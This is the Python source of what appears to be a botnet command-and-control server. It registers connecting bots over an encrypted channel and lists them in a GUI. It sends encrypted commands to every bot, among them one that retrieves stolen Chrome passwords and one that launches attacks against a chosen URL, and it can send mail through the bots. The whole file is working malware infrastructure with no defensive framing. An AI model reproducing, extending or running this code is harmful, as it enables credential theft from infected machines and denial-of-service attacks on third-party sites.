import tkinter
import socket
import threading
import http.server
import time
from cryptography.fernet import Fernet
from features.mailingSYS import Mail
from features.KoroGUI import GUI
from features.Cipher.RSAcrypto import RSAcrypto

class Server:
    def __init__(self, ip, port, server_socket):
        self.ip = ip
        self.port = port
        self.connected = []
        self.ipList = []
        self.keys = []
        self.server_socket = server_socket
        self.mailAccounts = open("mailAccounts.txt", 'r').read().split()
        self.GU = GUI(self)
        self.crypto = RSAcrypto()
        th = threading.Thread(target=self.createGUI)
        th.start()

    def createGUI(self):
        self.GU.main_gui()

    def onConnect(self, client, ip):
        client.send(self.crypto.getPubKey())
        print(self.crypto.getPubKey())
        encryptingKey = client.recv(10200)
        key = self.crypto.decrypt(encryptingKey)

        self.connected.append(client)
        self.ipList.append(ip)
        self.keys.append(Fernet(key))
        print(self.keys)

        open("IP.txt", 'a').write(str(ip) + "\n")
        print((self.ipList))
        self.GU.addOnlineBots(ip)

    def onDisconnect(self, client, ip):
        self.connected.remove(client)
        del self.keys[self.ipList.index(ip)]
        print(self.ipList.index(ip))
        self.GU.deleteOnlineBots(self.ipList.index(ip))
        self.ipList.remove(ip)

        if self.ipList == []:
            open("IP.txt", 'w')
        for i in self.ipList:
            open("IP.txt", 'w').write(str(i) + "\n")
        print(self.ipList)

    def sendCommand(self, cmd):
        for i, item in enumerate(self.connected):
            item.send(self.keys[i].encrypt(cmd.encode()))

    def getOnlineBots(self):
        return len(self.connected)

    def updateAlive(self):
        while True:
            time.sleep(0.2)
            delList = []
            for i in self.connected:
                try:
                    i.send(b'')
                except:
                    delList.append(i)

            for i in delList:
                self.onDisconnect(i, i.getpeername())

    def sendMailServer(self, subject, content, file, filename):
        Mail(subject, content, file, filename, self.connected, self.keys)

    def showPass(self, ask_from):
        for i, item in enumerate(self.connected):
            if ask_from == item.getpeername():
                item.send(self.keys[i].encrypt("%$chromePass".encode()))
                print(self.keys[i].decrypt(item.recv(1024)).decode())

    def attack(self, url, type):
        try:
            print(url)
            type = type.replace(" ", "")
            print(type)
            for i, item in enumerate(self.connected):
                item.send(self.keys[i].encrypt(("%$Att " + type + " " + url).encode()))
        except Exception as e:
            print(e)

    def stopattack(self):
        for i, item in enumerate(self.connected):
            item.send(self.keys[i].encrypt(("%$StopAtt").encode()))

open("IP.txt", 'w')
ip = "0.0.0.0"
port = 80

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 36983))
server.listen(1)

x = Server(ip, port, server)
th = threading.Thread(target=x.updateAlive)
th.start()

while True:
    client, ip = server.accept()
    threading.Thread(target=x.onConnect, args=[client, ip]).start()
